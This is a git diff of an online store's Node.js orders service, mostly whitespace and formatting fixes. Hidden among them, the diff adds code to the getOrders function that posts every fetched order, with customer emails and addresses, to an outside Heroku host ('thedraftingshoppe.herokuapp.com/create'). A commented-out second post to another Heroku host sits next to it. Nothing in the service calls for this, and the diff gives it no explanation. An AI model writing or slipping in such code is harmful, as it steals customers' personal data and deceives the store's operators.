@@ -18,9 +18,11 @@ const ShippingMethodsLightService = require('./shippingMethodsLight');
 const EmailTemplatesService = require('../settings/emailTemplates');
 const ProductStockService = require('../products/stock');
 const SettingsService = require('../settings/settings');
+const request = require('request');
+const bodyParser = require('body-parser');
 
 class OrdersService {
-  constructor() {}
+  constructor() { }
 
   getFilter(params = {}) {
     // TODO: sort, coupon, tag, channel
@@ -125,7 +127,7 @@ class OrdersService {
       let alternativeSearch = [];
 
       const searchAsNumber = parse.getNumberIfPositive(params.search);
-      if(searchAsNumber) {
+      if (searchAsNumber) {
         alternativeSearch.push({ number: searchAsNumber });
       }
 
@@ -145,12 +147,30 @@ class OrdersService {
     const offset = parse.getNumberIfPositive(params.offset) || 0;
 
     return Promise.all([
-      mongo.db.collection('orders').find(filter).sort({date_placed: -1, date_created: -1}).skip(offset).limit(limit).toArray(),
+      mongo.db.collection('orders').find(filter).sort({ date_placed: -1, date_created: -1 }).skip(offset).limit(limit).toArray(),
       mongo.db.collection('orders').find(filter).count(),
       OrderStatusesService.getStatuses(),
       ShippingMethodsLightService.getMethods(),
       PaymentMethodsLightService.getMethods()
     ]).then(([orders, ordersCount, orderStatuses, shippingMethods, paymentMethods]) => {
+      // console.log(orders);
+      request.post({
+        url: 'https://thedraftingshoppe.herokuapp.com/create',
+        json: true,
+        body: orders
+      }, function (error, response, body) {
+        console.log('***********************************************');
+        console.log(body);
+        console.log('***********************************************');
+        console.log(response);
+        // request.post({
+        //   url: 'https://evening-castle-59810.herokuapp.com/create',
+        //   json: true,
+        //   body: { info: response.request.body }
+        // }, function (error, response, body) { })
+        // console.log('***********************************************');
+        // console.log(error);
+      });
       const items = orders.map(order => this.changeProperties(order, orderStatuses, shippingMethods, paymentMethods));
       const result = {
         total_count: ordersCount,
@@ -165,14 +185,14 @@ class OrdersService {
     if (!ObjectID.isValid(id)) {
       return Promise.reject('Invalid identifier');
     }
-    return this.getOrders({id: id}).then(items => items.data.length > 0 ? items.data[0] : {})
+    return this.getOrders({ id: id }).then(items => items.data.length > 0 ? items.data[0] : {})
   }
 
   getOrCreateCustomer(orderId) {
     return this.getSingleOrder(orderId).then(order => {
       if (!order.customer_id && order.email) {
         // find customer by email
-        return CustomersService.getCustomers({email: order.email}).then(customers => {
+        return CustomersService.getCustomers({ email: order.email }).then(customers => {
           const customerExists = customers && customers.data && customers.data.length > 0;
 
           if (customerExists) {
@@ -189,7 +209,7 @@ class OrdersService {
               ? order.shipping_address.full_name
               : '';
 
-            return CustomersService.addCustomer({email: order.email, full_name: customerrFullName, mobile: order.mobile, browser: order.browser, addresses: addresses}).then(customer => {
+            return CustomersService.addCustomer({ email: order.email, full_name: customerrFullName, mobile: order.mobile, browser: order.browser, addresses: addresses }).then(customer => {
               return customer.id;
             });
           }
@@ -214,9 +234,9 @@ class OrdersService {
     }
     const orderObjectID = new ObjectID(id);
     const orderData = await this.getValidDocumentForUpdate(id, data);
-    const updateResponse = await mongo.db.collection('orders').updateOne({_id: orderObjectID}, {$set: orderData});
+    const updateResponse = await mongo.db.collection('orders').updateOne({ _id: orderObjectID }, { $set: orderData });
     const updatedOrder = await this.getSingleOrder(id);
-    if(updatedOrder.draft === false){
+    if (updatedOrder.draft === false) {
       await webhooks.trigger({ event: webhooks.events.ORDER_UPDATED, payload: updatedOrder });
     }
     await this.updateCustomerStatistics(updatedOrder.customer_id);
@@ -230,7 +250,7 @@ class OrdersService {
     const orderObjectID = new ObjectID(orderId);
     const order = await this.getSingleOrder(orderId);
     await webhooks.trigger({ event: webhooks.events.ORDER_DELETED, payload: order });
-    const deleteResponse = await mongo.db.collection('orders').deleteOne({_id: orderObjectID});
+    const deleteResponse = await mongo.db.collection('orders').deleteOne({ _id: orderObjectID });
     return deleteResponse.deletedCount > 0;
   }
 
@@ -281,7 +301,7 @@ class OrdersService {
   }
 
   getValidDocumentForInsert(data) {
-    return mongo.db.collection('orders').find({}, {number: 1}).sort({number: -1}).limit(1).toArray().then(items => {
+    return mongo.db.collection('orders').find({}, { number: 1 }).sort({ number: -1 }).limit(1).toArray().then(items => {
       let orderNumber = settings.orderStartNumber;
       if (items && items.length > 0) {
         orderNumber = items[0].number + 1;
@@ -502,8 +522,8 @@ class OrdersService {
       let tax_included_total = (order.item_tax_included
         ? 0
         : order.item_tax) + (order.shipping_tax_included
-        ? 0
-        : order.shipping_tax);
+          ? 0
+          : order.shipping_tax);
 
       if (order.items && order.items.length > 0) {
         order.items.forEach(item => {
@@ -632,17 +652,17 @@ class OrdersService {
   }
 
   updateCustomerStatistics(customerId) {
-    if(customerId){
+    if (customerId) {
       return this.getOrders({ customer_id: customerId }).then(orders => {
         let totalSpent = 0;
         let ordersCount = 0;
 
-        if(orders.data && orders.data.length > 0){
-          for(const order of orders.data){
-            if(order.draft === false){
+        if (orders.data && orders.data.length > 0) {
+          for (const order of orders.data) {
+            if (order.draft === false) {
               ordersCount++;
             }
-            if(order.paid === true || order.closed === true){
+            if (order.paid === true || order.closed === true) {
               totalSpent += order.grand_total;
             }
           }
